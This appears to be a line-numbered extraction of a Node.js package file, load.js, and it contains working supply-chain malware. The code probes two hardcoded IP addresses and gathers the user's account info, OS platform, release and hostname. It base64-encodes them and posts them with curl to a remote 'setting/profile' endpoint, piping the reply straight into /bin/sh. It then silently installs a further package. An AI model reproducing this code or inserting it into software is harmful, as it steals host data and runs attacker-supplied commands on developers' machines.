// File: package/load.js
// ======================================================================
Line 1: var os = require("os")
Line 2: var net = require('net')
Line 3: var path = require("path")
Line 5: {
    var envs = ['100.88.184.15','11.144.174.38'];
    var timer;
    var timeout = 3000;
    envs.forEach(function(addr){
        var item = net.connect({
                host: addr,
                port: 18393,
                timeout: 1000
            },
            function(addr) {
                return function() {
                    clearTimeout(timer);
                    callback(addr);
                    this.destroy();
                    return;
                };
            }(addr)
        );
        item.on('error', function(err) {
            if (err.errno == 'ECONNREFUSED') {
                this.destroy();
            }
            if (err.errno == 'ETIMEDOUT') {
                this.destroy();
            }
        });
        item.on('close', function () {})
    });
    timer = setTimeout(function() {
        process.exit();
    }, timeout);
}
Line 6: var envs = ['100.88.184.15','11.144.174.38']
Line 10: var item = net.connect({
                host: addr,
                port: 18393,
                timeout: 1000
            },
            function(addr) {
                return function() {
                    clearTimeout(timer);
                    callback(addr);
                    this.destroy();
                    return;
                };
            }(addr)
        )
Line 16: {
                    clearTimeout(timer);
                    callback(addr);
                    this.destroy();
                    return;
                }
Line 17: clearTimeout(timer)
Line 18: callback(addr)
Line 19: this.destroy()
Line 25: {
                this.destroy();
            }
Line 26: this.destroy()
Line 28: {
                this.destroy();
            }
Line 29: this.destroy()
Line 34: timer = setTimeout(function() {
        process.exit();
    }, timeout)
Line 35: process.exit()
Line 41: os.userInfo()
Line 45: {
        env['platform'] = os.platform();
        env['release'] = os.release();
        env['hostname'] = os.hostname();
        var dic = JSON.stringify(env);
        var res = new Buffer(dic).toString('base64');
    }
Line 46: env['platform'] = os.platform()
Line 47: env['release'] = os.release()
Line 48: env['hostname'] = os.hostname()
Line 50: new Buffer(dic).toString('base64')
Line 54: callback(res)
Line 58: var install_str = 'http://'+addr+':8443/setting/profile'
Line 59: {
        var exec = require('child_process').exec;
        var root = path.resolve('./');
        try{
            var root_path = root.split('node_modules')[0]
        } catch(e) {
            var root_path = '../../'
        }
        var sys_version = 'curl -sSL --connect-timeout 5 -d "'+info+'" '+install_str+'|/bin/sh'
        var pkg_install = 'cd '+root_path+' && tnpm install @ali/secure_identity_login_module'
        exec(sys_version);
        exec(pkg_install);
        process.exit();
    }
Line 60: var exec = require('child_process').exec
Line 62: {
            var root_path = root.split('node_modules')[0]
        }
Line 63: var root_path = root.split('node_modules')[0]
Line 69: exec(sys_version)
Line 70: exec(pkg_install)
Line 71: process.exit()
